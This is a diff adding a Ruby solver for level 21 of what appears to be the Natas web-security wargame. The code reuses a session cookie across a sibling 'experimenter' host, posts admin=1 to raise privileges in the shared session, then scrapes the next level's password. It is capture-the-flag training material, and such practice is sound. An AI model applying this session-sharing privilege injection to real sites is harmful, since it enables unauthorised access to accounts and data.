@@ -633,4 +633,32 @@ end
 # Level 21
 class NatasLevel21 < NatasLevelBase
   LEVEL = 21
+  PAGE = '/'
+  EXP_HOST = "natas21-experimenter.#{HOST}"
+
+  def exec
+    response = get(PAGE)
+    cookie = response['Set-Cookie']
+    session_id = cookie.split('; ').first
+    client = Net::HTTP.new(EXP_HOST, PORT)
+    request = Net::HTTP::Post.new(PAGE, { 'Cookie' => session_id })
+    request.basic_auth(@login, @password)
+    request.set_form(
+      {
+        'admin' => 1,
+        'submit' => 'Update'
+      }
+    )
+    client.request(request)
+    data = get(PAGE, { 'Cookie' => session_id }).body
+    match = %r(Password: (\w{32})</pre>).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+##
+
+# Level 22
+class NatasLevel22 < NatasLevelBase
+  LEVEL = 22
 end
